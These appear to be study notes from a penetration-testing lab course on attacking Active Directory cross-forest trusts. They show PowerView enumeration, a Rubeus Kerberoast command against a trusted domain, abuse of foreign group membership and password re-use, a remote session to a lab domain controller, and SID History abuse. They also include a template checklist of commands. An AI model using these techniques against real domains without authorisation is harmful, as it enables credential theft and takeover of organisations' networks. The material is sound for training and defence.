# Attacking Domain Trusts - Cross-Forest Trust Abuse - from Windows

## Cross-Forest Kerberoasting

Kerberoasting and ASREPRoasting can be performed **across trusts**, depending on trust direction. In a situation where you are positioned in a domain with either an inbound or bidirectional domain/forest trust, you can likely perform various attacks to gain a foothold. Sometimes the win isn't in the current domain at all — but instead can obtain a Kerberos ticket and crack a hash for an administrative user in another domain that has Domain/Enterprise Admin privileges in both domains.
### Enumerate SPN Accounts in the Target Domain

```powershell
PS C:\htb> Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName

samaccountname
--------------
krbtgt
mssqlsvc
```
one account with an SPN in the target domain.
### Check Group Membership

```powershell
PS C:\htb> Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof

samaccountname memberof
-------------- --------
mssqlsvc       CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL
```

`mssqlsvc` is a **Domain Admin** in the target domain — a high-value Kerberoast target.

### Kerberoast Across the Trust with Rubeus

```powershell
PS C:\htb> .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
```

`/domain:` = same Rubeus syntax as normal Kerberoasting, just pointed at the trusted domain. Crack with Hashcat as usual — a successful crack means **two fully-controlled domains** from one standard Kerberoast.

## Admin Password Re-Use & Group Membership

> [!info] Common scenario
> When the same admin team manages both sides of a bidirectional forest trust, admin account password re-use across domains is common. Taking over Domain A's built-in Administrator (or an Enterprise/Domain Admin) and finding a **similarly named** privileged account in Domain B — e.g. `adm_bob.smith` in Domain A vs. `bsmith_admin` in Domain B — is worth testing for shared passwords. Owning Domain A can instantly hand over Domain B this way.

> [!info] Foreign group membership
> Only **Domain Local Groups** allow security principals from outside their own forest. It's not uncommon to find a Domain Admin/Enterprise Admin from Domain A sitting inside the built-in **Administrators** group of Domain B under a bidirectional forest trust. Taking over that admin in Domain A grants immediate admin access to Domain B via that membership.

### Enumerate Foreign Group Membership

We can use the PowerView function [Get-DomainForeignGroupMember](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainForeignGroupMember/) to enumerate groups with users that do not belong to the domain, also known as `foreign group membership`

```powershell
PS C:\htb> Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL

GroupDomain             : FREIGHTLOGISTICS.LOCAL
GroupName               : Administrators
GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=FREIGHTLOGISTICS,DC=LOCAL
MemberDomain            : FREIGHTLOGISTICS.LOCAL
MemberName              : S-1-5-21-3842939050-3880317879-2865463114-500
MemberDistinguishedName : CN=S-1-5-21-3842939050-3880317879-2865463114-500,CN=ForeignSecurityPrincipals,DC=FREIGHTLOGISTICS,DC=LOCAL

PS C:\htb> Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500

INLANEFREIGHT\administrator
```

The built-in Administrator of `INLANEFREIGHT.LOCAL` is a member of `FREIGHTLOGISTICS.LOCAL`'s built-in Administrators group.

### Confirm Access( Accessing DC03 Using Enter-PSSession)

```powershell
PS C:\htb> Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator

[ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL]: PS C:\Users\administrator.INLANEFREIGHT\Documents> whoami
inlanefreight\administrator
[ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL]: PS C:\Users\administrator.INLANEFREIGHT\Documents> ipconfig /all

Windows IP Configuration

   Host Name . . . . . . . . . . . . : ACADEMY-EA-DC03
   Primary Dns Suffix  . . . . . . . : FREIGHTLOGISTICS.LOCAL
   DNS Suffix Search List. . . . . . : FREIGHTLOGISTICS.LOCAL
```

Successfully authenticated across the forest trust using `INLANEFREIGHT.LOCAL`'s Administrator account — confirmed by `whoami` and the target host's identity.

> [!tip] Quick win worth always checking
> After taking control of one domain in a bidirectional forest trust, checking for this kind of foreign group membership is a fast way to find a second domain already open — assuming the second forest is in scope.

## SID History Abuse — Cross-Forest

SID History abuse also works **across** a forest trust, not just parent-child. If a user is migrated between forests and **SID Filtering is not enabled**, an admin SID from the source forest can be added to the migrated account's SID history — and that SID rides along in the token whenever the account authenticates across the trust.

**Example:** `jjones` migrates from `INLANEFREIGHT.LOCAL` to `CORP.LOCAL` (a different forest). If SID filtering is off during migration and `jjones` had admin rights (or ACE entries, share access, etc.) in `INLANEFREIGHT.LOCAL`, those rights persist even after becoming a `CORP.LOCAL` member — the original admin SID is still riding along in the token.

**you can add ANY administrative SID to the migrating user's `sIDHistory` attribute**, even if that user had no administrative privileges originally.

## Key Takeaways

- [ ] Cross-forest Kerberoasting: `Rubeus.exe kerberoast /domain:<target-domain> /user:<user> /nowrap` — same syntax, just point at a trusted domain
- [ ] `Get-DomainUser -SPN -Domain <domain>` enumerates SPN accounts in a trusted domain from your current session
- [ ] Admin account password re-use across similarly-named accounts in trusted domains is a common, quick-check pattern
- [ ] `Get-DomainForeignGroupMember -Domain <domain>` finds accounts from outside the domain sitting in local groups — only **Domain Local Groups** allow foreign principals
- [ ] `Convert-SidToName` resolves a raw SID (from ForeignSecurityPrincipals) back to a readable account name
- [ ] SID History abuse works cross-forest too, not just parent-child, when SID Filtering is disabled during migration
